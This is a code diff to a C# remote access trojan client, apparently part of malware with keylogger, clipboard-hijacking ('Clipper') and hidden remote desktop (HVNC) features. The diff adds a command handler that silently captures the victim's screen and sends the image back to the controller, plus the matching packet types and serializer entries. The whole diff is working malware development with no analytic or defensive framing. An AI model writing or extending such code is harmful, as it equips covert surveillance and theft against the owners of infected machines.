@@ -595,6 +595,20 @@ internal class TlsClient : IDisposable
                         _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.DevAck, Data = DeviceManagerFeature.Uninstall(devUninst.DeviceId) }, CancellationToken.None));
                     break;
 
+                // ── Screenshot ───────────────────────────────────────
+                case PacketType.Screenshot:
+                    _ = Task.Run(async () =>
+                    {
+                        var jpeg = ScreenshotFeature.Capture(55);
+                        await WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.ScreenshotResult,
+                            Data = JsonSerializer.Serialize(new ScreenshotResultStub { Data = jpeg },
+                                       SeroJson.Default.ScreenshotResultStub)
+                        }, CancellationToken.None);
+                    });
+                    break;
+
                 // ── Keylogger ────────────────────────────────────────
                 case PacketType.KeyloggerStart:
                     KeyloggerFeature.Start();
@@ -1706,6 +1720,9 @@ internal enum PacketType
     ClipperGetStats     = 181,
     ClipperStatsResult  = 182,
     ClipperDetected     = 183,
+
+    Screenshot       = 280,
+    ScreenshotResult = 281,
 }
 
 internal class Packet
@@ -1893,6 +1910,7 @@ internal class HvncClipboardDataStub
 [JsonSerializable(typeof(ClipperSetConfigStub))]
 [JsonSerializable(typeof(ClipperConfig))]
 [JsonSerializable(typeof(ClipperDetectedStub))]
+[JsonSerializable(typeof(ScreenshotResultStub))]
 [JsonSerializable(typeof(ClipperStatsResultStub))]
 // CDP Signup
 [JsonSerializable(typeof(CdpSignupStatusStub))]
